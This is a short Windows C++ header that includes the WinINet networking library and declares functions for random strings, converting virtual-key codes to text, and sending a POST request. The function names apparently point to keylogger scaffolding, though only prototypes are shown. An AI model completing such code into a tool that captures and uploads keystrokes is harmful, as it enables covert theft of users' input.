#pragma once

#include <string>
#include <thread>
#include <tchar.h>
#include <random>
#include <iostream>
#include <strsafe.h>
#include <stdio.h>
#include <windows.h> 
#include <wininet.h>

#define sleep(_time) (std::this_thread::sleep_for(std::chrono::milliseconds(_time))) 

// PROTOS
LPCSTR random_string(size_t length);
STRSAFE_LPSTR vkCodeToString(INT vkCode);
void postRequest();